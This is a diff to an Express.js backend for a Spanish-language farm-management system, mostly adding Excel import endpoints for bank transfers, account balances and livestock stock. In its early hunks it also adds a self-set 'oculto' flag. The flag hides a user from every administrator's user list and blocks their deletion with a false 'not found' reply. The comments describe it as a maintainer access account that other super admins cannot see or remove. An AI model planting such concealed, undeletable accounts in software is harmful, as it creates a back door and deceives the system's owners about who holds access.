@@ -24,8 +24,8 @@ const app = express();
 // Versión actual del sistema. Se incrementa con cada release.
 // Endpoint /api/system/version la expone para que el frontend la muestre
 // y para que el script Update-AgroCore.ps1 compare antes de pullear.
-const AGROCORE_VERSION = '0.7.2';
-const AGROCORE_BUILD = new Date('2026-06-08').toISOString().slice(0, 10);
+const AGROCORE_VERSION = '0.7.3';
+const AGROCORE_BUILD = new Date('2026-06-10').toISOString().slice(0, 10);
 
 // ============================================================
 // CONFIG
@@ -457,6 +457,7 @@ async function serializeUser(u) {
     nombre: u.nombre, apellido: u.apellido,
     fotoUrl: u.fotoUrl || null,
     superAdmin: u.superAdmin,
+    oculto: u.oculto || false,
     companies,
     memberships: u.userCompanies.map((uc) => ({
       companyId: uc.companyId, companyName: uc.company.name,
@@ -567,6 +568,23 @@ app.put('/api/me/preferences', authMiddleware, async (req, res, next) => {
       update: data,
     });
     res.json({ ok: true, data: row });
+  } catch (e) { next(e); }
+});
+
+// Permite que un usuario active/desactive el flag "oculto" sobre SI MISMO.
+// Solo el propio user puede hacerlo, no se puede toggleear este flag en otro
+// usuario por mas que sea super admin. Sirve para que el mantenedor del sistema
+// tenga un usuario "invisible" al resto.
+app.put('/api/me/oculto', authMiddleware, async (req, res, next) => {
+  try {
+    const schema = z.object({ oculto: z.boolean() });
+    const { oculto } = schema.parse(req.body || {});
+    const u = await prisma.user.update({
+      where: { id: req.user.id },
+      data: { oculto },
+      select: { id: true, oculto: true },
+    });
+    res.json({ ok: true, data: u });
   } catch (e) { next(e); }
 });
 
@@ -1288,7 +1306,12 @@ function canManageUsers(req) {
 app.get('/api/usuarios', async (req, res, next) => {
   try {
     if (!canManageUsers(req)) return res.status(403).json({ ok: false, error: 'Sin permisos' });
-    const where = req.user.superAdmin ? {} : { userCompanies: { some: { companyId: req.companyId } } };
+    // Filtro base: super admins ven todos los usuarios; el resto solo los de sus empresas.
+    const baseWhere = req.user.superAdmin ? {} : { userCompanies: { some: { companyId: req.companyId } } };
+    // Usuarios "ocultos" son invisibles para todos salvo el propio user.
+    // Esto permite que un mantenedor del sistema (ej. soporte) tenga un acceso
+    // de emergencia que ningun otro super admin pueda borrar o ver.
+    const where = { AND: [ baseWhere, { OR: [ { oculto: false }, { id: req.user.id } ] } ] };
     const users = await prisma.user.findMany({
       where,
       include: { userCompanies: { include: { role: true, company: true } } },
@@ -1301,6 +1324,7 @@ app.get('/api/usuarios', async (req, res, next) => {
         nombre: u.nombre, apellido: u.apellido,
         fotoUrl: u.fotoUrl || null,
         activo: u.activo, superAdmin: u.superAdmin,
+        oculto: u.oculto || false,
         memberships: u.userCompanies.map((uc) => ({
           companyId: uc.companyId, companyName: uc.company.name,
           roleId: uc.roleId, roleKey: uc.role.key, roleLabel: uc.role.label,
@@ -1419,6 +1443,13 @@ app.delete('/api/usuarios/:id', async (req, res, next) => {
     }
     const target = await prisma.user.findUnique({ where: { id: targetId } });
     if (!target) return res.status(404).json({ ok: false, error: 'Usuario no encontrado' });
+
+    // Usuarios "ocultos" no se pueden borrar (ni siquiera por otros super admins).
+    // Es el ancla del mantenedor del sistema — solo el propio user puede desactivarse
+    // el flag oculto desde su perfil y, una vez visible, recién ahí lo puede borrar.
+    if (target.oculto && targetId !== req.user.id) {
+      return res.status(404).json({ ok: false, error: 'Usuario no encontrado' });
+    }
 
     // Si el target es super admin, validar que quede al menos uno
     if (target.superAdmin) {
@@ -4726,6 +4757,256 @@ app.post('/api/admin/importar-cliente/cerdos-ventas', authMiddleware, requireCom
       } catch (e) { errores.push({ fila: i+2, error: e.message }); }
     }
     res.json({ ok: true, importados: ok, fallos: errores.length, errores: errores.slice(0, 50) });
+  } catch (e) { next(e); }
+});
+
+// === Importar TRANSFERENCIAS bancarias (Excel del cliente) ===
+// Hojas esperadas: "Todas" (todas las transferencias hechas) y opcionalmente "No estan pasadas".
+// Columnas: Fecha real | Fecha pasada al grupo | Banco | Empresa | Tipo de cuenta |
+//           Monto | Detalle de transferencia | Quien la realizó | (Si) | observaciones
+// Crea BancoCuenta automáticamente para cada banco que no exista, y un BancoMovimiento por fila
+// con tipo = "transferencia_out" (egreso por transferencia).
+app.post('/api/admin/importar-cliente/transferencias', authMiddleware, requireCompany, requirePermission('finanzas:create'), upload.single('archivo'), async (req, res, next) => {
+  try {
+    if (!req.file) return res.status(400).json({ ok: false, error: 'Falta el archivo' });
+    const wb = XLSX.read(req.file.buffer, { type: 'buffer' });
+    let ok = 0; const errores = [];
+    // Cache de cuentas bancarias para no buscar/crear por cada fila
+    const cuentasCache = new Map(); // key = banco normalizado
+    async function getOrCreateCuenta(banco) {
+      if (!banco) return null;
+      const key = _normalizar(banco);
+      if (cuentasCache.has(key)) return cuentasCache.get(key);
+      let cuenta = await prisma.bancoCuenta.findFirst({
+        where: { companyId: req.companyId, banco: { equals: banco, mode: 'insensitive' } },
+      });
+      if (!cuenta) {
+        cuenta = await prisma.bancoCuenta.create({ data: {
+          companyId: req.companyId, banco: banco.trim(),
+          tipo: 'cta_cte', moneda: 'ARS', titular: null,
+        }});
+      }
+      cuentasCache.set(key, cuenta);
+      return cuenta;
+    }
+
+    // Procesar hoja "Todas" (la principal). Si no existe usar la primera.
+    const shTodas = wb.SheetNames.find(n => /todas/i.test(n)) || wb.SheetNames[0];
+    const rows = XLSX.utils.sheet_to_json(wb.Sheets[shTodas], { defval: null, raw: false });
+    if (rows.length === 0) {
+      return res.json({ ok: true, importados: 0, fallos: 0, errores: [],
+        diagnostico: { hojas: wb.SheetNames, hoja_procesada: shTodas, filas_leidas: 0,
+          mensaje: 'La hoja no tiene filas con datos. Verificá que el archivo no esté vacío y que la primera fila sean los headers.' } });
+    }
+    // Buscar columnas por palabras clave (tolera mayúsculas, espacios extra, acentos)
+    function findKey(row, ...keywords) {
+      const keys = Object.keys(row);
+      for (const kw of keywords) {
+        const kwN = _normalizar(kw);
+        const k = keys.find(key => _normalizar(key).includes(kwN));
+        if (k) return k;
+      }
+      return null;
+    }
+    const kBanco   = findKey(rows[0], 'banco');
+    const kMonto   = findKey(rows[0], 'monto', 'importe');
+    const kFecha   = findKey(rows[0], 'fecha real', 'fecha de cuando se realiz', 'fecha');
+    const kEmpresa = findKey(rows[0], 'empresa');
+    const kDetalle = findKey(rows[0], 'detalle de transferencia', 'detalle', 'transferencia');
+    const kQuien   = findKey(rows[0], 'quien la realiz', 'quien');
+    const kObs     = findKey(rows[0], 'observac');
+
+    if (!kBanco || !kMonto || !kFecha) {
+      return res.status(400).json({ ok: false,
+        error: 'No se encontraron las columnas obligatorias Banco, Monto y Fecha. Verificá que estén en la fila 1 del Excel.',
+        diagnostico: { hoja_procesada: shTodas, columnas_excel: Object.keys(rows[0]),
+          columnas_detectadas: { banco: kBanco, monto: kMonto, fecha: kFecha } } });
+    }
+
+    for (let i = 0; i < rows.length; i++) {
+      const r = rows[i];
+      try {
+        const banco = r[kBanco];
+        const monto = _parseMonto(r[kMonto]);
+        const fecha = _parseFechaArg(r[kFecha]);
+        if (!banco || !monto || !fecha) continue;
+        const cuenta = await getOrCreateCuenta(banco);
+        if (!cuenta) continue;
+        const empresa = kEmpresa ? (r[kEmpresa] || '') : '';
+        const detalle = kDetalle ? (r[kDetalle] || 'Transferencia') : 'Transferencia';
+        const quien   = kQuien ? (r[kQuien] || '') : '';
+        const obs     = kObs ? (r[kObs] || '') : '';
+        await prisma.bancoMovimiento.create({ data: {
+          companyId: req.companyId, cuentaId: cuenta.id,
+          fecha, tipo: 'transferencia_out', concepto: String(detalle),
+          monto: Math.abs(monto),
+          contraparte: String(detalle).length > 100 ? String(detalle).slice(0, 100) : String(detalle),
+          observaciones: [empresa && `Empresa: ${empresa}`, quien && `Operó: ${quien}`, obs].filter(Boolean).join(' · ') || null,
+          userId: req.user?.id || null,
+        }});
+        ok++;
+      } catch (e) { errores.push({ hoja: shTodas, fila: i+2, error: e.message }); }
+    }
+    res.json({ ok: true, importados: ok, fallos: errores.length, errores: errores.slice(0, 100),
+      diagnostico: { hoja_procesada: shTodas, filas_leidas: rows.length,
+        columnas_detectadas: { banco: kBanco, monto: kMonto, fecha: kFecha, empresa: kEmpresa, detalle: kDetalle } } });
+  } catch (e) { next(e); }
+});
+
+// === Importar SALDOS DE CUENTAS CORRIENTES (Excel del cliente) ===
+// Hoja "Resumen": deudas y créditos pendientes con proveedores/clientes.
+// Header está en fila 3 (porque fila 1-2 son leyenda de colores).
+// Columnas: Nombre del cliente/proveedor | Saldo total | Transferencia o echeq |
+//           Fecha de la solicitud | Prioridad | Estado de la cuenta |
+//           Observaciones | Fecha de pago | Reclaman
+// Carga cada fila como CtaCte con contactoTipo='libre' y haber=saldoTotal (deuda a pagar).
+app.post('/api/admin/importar-cliente/ctacte-saldos', authMiddleware, requireCompany, requirePermission('finanzas:create'), upload.single('archivo'), async (req, res, next) => {
+  try {
+    if (!req.file) return res.status(400).json({ ok: false, error: 'Falta el archivo' });
+    const wb = XLSX.read(req.file.buffer, { type: 'buffer' });
+    let ok = 0; const errores = [];
+    const shResumen = wb.SheetNames.find(n => /resumen/i.test(n)) || wb.SheetNames[0];
+    const ws = wb.Sheets[shResumen];
+    // Leer todo como arreglo de arreglos (para manejar bien el offset del header en fila 3)
+    const allRows = XLSX.utils.sheet_to_json(ws, { defval: null, header: 1, raw: false });
+    // El header está en fila 3 (index 2). Encontrar la columna por nombre.
+    const header = (allRows[2] || []).map(c => _normalizar(c));
+    const idx = {
+      nombre:    header.findIndex(c => c && c.includes('nombre')),
+      saldo:     header.findIndex(c => c && c.includes('saldo')),
+      tipo:      header.findIndex(c => c && (c.includes('transferencia') || c.includes('echeq'))),
+      prioridad: header.findIndex(c => c && c.includes('prioridad')),
+      estado:    header.findIndex(c => c && c.includes('estado')),
+      obs:       header.findIndex(c => c && c.includes('observaciones')),
+      vence:     header.findIndex(c => c && c.includes('pago')),
+      reclaman:  header.findIndex(c => c && c.includes('reclam')),
+    };
+    if (idx.nombre < 0 || idx.saldo < 0) {
+      return res.status(400).json({ ok: false, error: 'No se encontraron las columnas Nombre y Saldo total en fila 3 de la hoja Resumen.' });
+    }
+    // Empezar a leer datos desde fila 4 (index 3)
+    for (let i = 3; i < allRows.length; i++) {
+      const r = allRows[i];
+      if (!r || r.every(c => c === null || c === '' )) continue;
+      try {
+        const nombre = r[idx.nombre];
+        const saldo  = _parseMonto(r[idx.saldo]);
+        if (!nombre || !saldo) continue;
+        const estado = _normalizar(r[idx.estado] || '');
+        const pagado = estado.includes('pagad') || estado.includes('saldad');
+        const prioridad = r[idx.prioridad] || '';
+        const tipoPago  = r[idx.tipo] || '';
+        const reclaman  = r[idx.reclaman] || '';
+        const obsExtra  = r[idx.obs] || '';
+        const vence     = _parseFechaArg(r[idx.vence]);
+        await prisma.ctaCte.create({ data: {
+          companyId: req.companyId,
+          contactoTipo: 'libre',
+          nombreLibre: String(nombre).trim(),
+          fecha: new Date(),
+          vencimiento: vence,
+          detalle: `Saldo importado (${tipoPago || 'pago'})${prioridad ? ' — ' + prioridad : ''}`,
+          categoria: 'Otro',
+          haber: saldo,
+          pagado,
+          observaciones: [
+            tipoPago && `Tipo: ${tipoPago}`,
+            estado && `Estado: ${estado}`,
+            reclaman && `Reclaman: ${reclaman}`,
+            obsExtra,
+          ].filter(Boolean).join(' · ') || null,
+        }});
+        ok++;
+      } catch (e) { errores.push({ hoja: shResumen, fila: i+1, error: e.message }); }
+    }
+    res.json({ ok: true, importados: ok, fallos: errores.length, errores: errores.slice(0, 100) });
+  } catch (e) { next(e); }
+});
+
+// === Importar STOCK DE HACIENDA (Excel del cliente) ===
+// Una hoja por Renspa/campo. Cada hoja:
+//   - Fila 1: "RENSPA: <código>" y "FECHA:"
+//   - Fila 3: header — Especie | Categoria | Stock | Cambio | Stock real | Diferencia | Notas
+//   - Datos desde fila 4
+//   - Última fila: TOTAL (se ignora)
+// Crea/actualiza HaciendaStock por (campo, categoria) con declarado = Stock real.
+// El campo se crea automáticamente si no existe (nombre = nombre de la hoja).
+app.post('/api/admin/importar-cliente/stock-hacienda', authMiddleware, requireCompany, requirePermission('stock:create'), upload.single('archivo'), async (req, res, next) => {
+  try {
+    if (!req.file) return res.status(400).json({ ok: false, error: 'Falta el archivo' });
+    const wb = XLSX.read(req.file.buffer, { type: 'buffer' });
+    let ok = 0; const errores = [];
+    const camposCache = new Map();
+    async function getOrCreateCampo(nombre) {
+      if (!nombre) return null;
+      const key = _normalizar(nombre);
+      if (camposCache.has(key)) return camposCache.get(key);
+      let campo = await prisma.campo.findFirst({
+        where: { companyId: req.companyId, nombre: { equals: nombre, mode: 'insensitive' } },
+      });
+      if (!campo) {
+        campo = await prisma.campo.create({ data: {
+          companyId: req.companyId, nombre: nombre.trim(), activo: true,
+        }});
+      }
+      camposCache.set(key, campo);
+      return campo;
+    }
+
+    for (const shName of wb.SheetNames) {
+      try {
+        const ws = wb.Sheets[shName];
+        const allRows = XLSX.utils.sheet_to_json(ws, { defval: null, header: 1, raw: false });
+        // Detectar header (busca fila con "Especie" en alguna columna, primeras 10 filas)
+        let headerRowIdx = -1;
+        for (let r = 0; r < Math.min(10, allRows.length); r++) {
+          if ((allRows[r] || []).some(c => _normalizar(c) === 'especie')) {
+            headerRowIdx = r; break;
+          }
+        }
+        if (headerRowIdx < 0) continue;
+        const header = allRows[headerRowIdx].map(c => _normalizar(c));
+        const idx = {
+          especie:  header.findIndex(c => c === 'especie'),
+          categoria:header.findIndex(c => c && c.includes('categoria')),
+          stockReal:header.findIndex(c => c && c.includes('stock real')),
+          stock:    header.findIndex(c => c === 'stock'),
+          obs:      header.findIndex(c => c && (c.includes('nota') || c.includes('observ'))),
+        };
+        // Crear (o tomar) el campo correspondiente a esta hoja
+        const campo = await getOrCreateCampo(shName);
+        if (!campo) continue;
+        // Empezar a procesar desde la fila siguiente al header
+        for (let i = headerRowIdx + 1; i < allRows.length; i++) {
+          const r = allRows[i];
+          if (!r) continue;
+          const especie = r[idx.especie];
+          const cat     = r[idx.categoria];
+          // Saltar fila TOTAL
+          if (_normalizar(especie) === 'total' || _normalizar(cat) === 'total') continue;
+          if (!especie && !cat) continue;
+          const stockReal = _parseMonto(r[idx.stockReal] >= 0 ? r[idx.stockReal] : null) ?? _parseMonto(r[idx.stock]);
+          if (stockReal === null || stockReal === undefined) continue;
+          const catCompleta = [especie, cat].filter(Boolean).join(' - ').trim();
+          if (!catCompleta) continue;
+          try {
+            await prisma.haciendaStock.upsert({
+              where: { companyId_campoId_categoria: {
+                companyId: req.companyId, campoId: campo.id, categoria: catCompleta,
+              }},
+              create: {
+                companyId: req.companyId, campoId: campo.id,
+                categoria: catCompleta, declarado: Math.round(stockReal),
+                observaciones: r[idx.obs] || null,
+              },
+              update: { declarado: Math.round(stockReal), observaciones: r[idx.obs] || undefined },
+            });
+            ok++;
+          } catch (e) { errores.push({ hoja: shName, fila: i+1, error: e.message }); }
+        }
+      } catch (e) { errores.push({ hoja: shName, fila: 0, error: e.message }); }
+    }
+    res.json({ ok: true, importados: ok, fallos: errores.length, errores: errores.slice(0, 100) });
   } catch (e) { next(e); }
 });
 
